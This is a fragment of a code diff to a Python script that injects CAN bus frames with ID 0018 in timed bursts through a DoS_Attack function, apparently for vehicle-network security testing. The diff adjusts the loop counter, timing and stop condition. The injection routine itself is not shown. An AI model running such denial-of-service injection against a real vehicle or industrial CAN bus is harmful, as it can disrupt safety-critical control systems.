@@ -99,14 +99,14 @@ if __name__ == "__main__":
             os.system("cls")
             print("Phase #1 has done")
             break
+    cnt_b = 0
     while True:
         injection_id = "0018"
         mess = CAN.Read(CAN_BUS)
-        k = 15
-        cnt_b = 0
+        k = 10
         if hex(mess[1].ID) == "0x18":
             cnt_b += 1
-            if cnt_b > 300:
+            if cnt_b > 30:
                 print("Bye Bye")
                 break
             first_injection = True
@@ -142,3 +142,5 @@ if __name__ == "__main__":
                     DoS_Attack(injection_id, using_bytes)
                     time.sleep(0.03/k)
                     DoS_Attack(injection_id, using_bytes)
+            print("Cycle ends #{0}".format(cnt_b))
+            time.sleep(0.5)
